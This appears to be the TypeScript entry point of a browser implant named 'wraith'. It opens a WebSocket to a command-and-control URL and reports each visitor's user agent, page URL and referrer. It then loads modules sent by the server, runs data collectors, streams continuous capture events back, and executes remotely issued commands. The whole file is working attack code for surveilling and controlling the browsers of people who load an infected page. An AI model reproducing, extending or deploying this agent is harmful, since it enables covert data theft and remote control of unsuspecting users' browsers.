import { defaultEncoder } from './encoding/index.js'
import { WebSocketAgentTransport } from './transport/websocket.js'
import { ModuleRuntime } from './runtime/loader.js'
import { CaptureEngine } from './capture/engine.js'
import { CommandHandler } from './commands/handler.js'

declare const __WRAITH_C2_URL__: string

;(function () {
  if ((window as unknown as Record<string, unknown>).__wraith__) return
  ;(window as unknown as Record<string, unknown>).__wraith__ = true
  const transport = new WebSocketAgentTransport(defaultEncoder)
  const runtime   = new ModuleRuntime()
  const capture   = new CaptureEngine()

  const send = (data: unknown) => transport.send(data)

  const commandHandler = new CommandHandler(runtime, (commandId, result, error) => {
    send({ type: 'command_result', commandId, result, error })
  })

  let sessionId: string | null = null
  let ready = false
  let heartbeatId: ReturnType<typeof setInterval> | null = null

  transport.onOpen(() => {
    send({
      type: 'handshake',
      meta: {
        userAgent:   navigator.userAgent,
        url:         location.href,
        referrer:    document.referrer,
        connectedAt: Date.now(),
      },
    })
  })

  transport.onMessage((raw) => {
    const msg = raw as Record<string, unknown>

    if (msg.type === 'session_ack') {
      sessionId = msg.sessionId as string
      return
    }

    if (msg.type === 'module_configs' && !ready) {
      ready = true
      const modules = msg.modules as Parameters<typeof runtime.load>[0]
      runtime.load(modules)
      runtime.setup()
      runtime.buildCommandHandlers()

      // Fire one-shot init collectors
      runtime.runInit((moduleId, key, value, persist) => {
        send({ type: 'init_data', moduleId, key, value, persist })
      })

      // Start continuous capture
      capture.start(runtime.getConfigs(), (moduleId, eventType, payload, persist) => {
        send({ type: 'event', moduleId, eventType, payload, timestamp: Date.now(), persist })
      })

      // Heartbeat
      heartbeatId = setInterval(() => send({ type: 'ping' }), 15_000)
      return
    }

    if (msg.type === 'command') {
      commandHandler.handle(msg as { commandId: string; moduleId: string; commandDef: string; params: Record<string, unknown> })
      return
    }
  })

  transport.onClose(() => {
    if (heartbeatId !== null) { clearInterval(heartbeatId); heartbeatId = null }
    capture.stop()
    ready = false
    sessionId = null
  })

  transport.connect(__WRAITH_C2_URL__)
})()
